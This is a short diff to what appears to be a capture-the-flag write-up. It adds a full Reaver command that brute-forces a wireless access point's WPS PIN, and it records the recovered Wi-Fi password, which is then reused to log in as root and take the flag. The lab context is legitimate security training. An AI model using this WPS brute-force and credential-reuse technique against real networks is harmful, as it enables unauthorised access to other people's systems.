@@ -38,7 +38,7 @@
 - Reaver has network capability `/usr/bin/reaver = cap_net_raw+ep`
 - Scan network interfaces `iwlist scan`
 - wlan0 BSSID: `02:00:00:00:00:00`
-- Find monitor interface `wlan0` with `iwconfig`
-- Use Reaver to get the PIN: `12345670` and Password: `WhatIsRealAnDWhAtIsNot51121!`
+- Find monitor interface `mon0` with `iwconfig`
+- Use Reaver `reaver -i mon0 -b 02:00:00:00:00:00 -vv` to get the PIN: `12345670` and Password: `WhatIsRealAnDWhAtIsNot51121!`
 - Login to `root` with the password
 - The root flag is in the root user's home directory
